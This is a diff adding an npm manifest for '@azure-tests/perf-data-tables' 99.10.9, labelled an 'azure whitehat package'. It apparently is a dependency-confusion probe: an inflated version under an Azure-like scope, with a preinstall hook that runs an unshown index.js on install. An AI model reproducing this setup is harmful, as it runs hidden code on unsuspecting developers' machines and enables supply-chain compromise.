@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-data-tables",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-data-tables@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-jX1HEE6UIPbKns/TknfAgDn8vtAv/t59T0yI4ezJ6RYPVmCqWinAsH59l/JQoLsWma7QQ8kAoLppTWISqS+o5w==",
+        "shasum": "942c77f47b59171b08b31f419ecd92cf32851c18",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-data-tables/-/perf-data-tables-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3593,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRS9CRA9TVsSAnZWagAAlIQQAJy7iaiQWMIhfF7vgRyP\n8irvUzjF2hTStINaAIEQYPG0Ls0AfRJa3o3CeJtJp/IMm01c8hpmyei+Xj/5\nBYYRvoKJLqp6yulQE7at/KhjhSDpczlvOeLBBr8Tc3Fceav8cKVDpI6rodFk\nI+4/XcUevqVWDTgCacb26V9tqZqiz8ziZ5bBFL+IT3QBQdZ8lqYYAgJBUy2S\nl+MAiA9PlK/tXAPMO+sFNdqab6Dhuap87IHIpFx0UKREH7HDxkWyLWO6mpt6\ng58tm1xMzfJWh9QzehejDGqEnpEnO1ZooiHWVV2q6HbpgQ0VVH2D9X99PteS\nIyPFmnCNjNcUCJhcYlnRFR4fdtXAFVgKd7enkcD7D0fz/F3+l8ossug6CQ7s\nAzP4ogGBOUuXTmY1mC8UPOAh/turtVDgDikTdwBxhb5AbUlmeU7hcVoeYM+v\nivgnLPs9HeOJyhA1Zhcc7XQZDYcM2c67v2cD9FgxnkWdMy/C95/2+51oBkeu\nA8n+nNgLD9247tG1Sc5QfvBLQ/h+esjMCMTkx1sahfeJHsF1ugJ18iuerwsI\nZWyw/SuC/KN6jwJB6x9ZCav/It1FjqBgVJu+hl7VJRHnIdM7rHTpUd52+kXq\nV6Uu/HCHd3bzKh/PbbMJgKF/hTyos652KtA5BzDjlLeSZNBh+9pRLySeBUHC\nVOvJ\r\n=3uEo\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-data-tables_99.10.9_1637946557403_0.48204595208823076"
+    },
+    "_hasShrinkwrap": false
+}
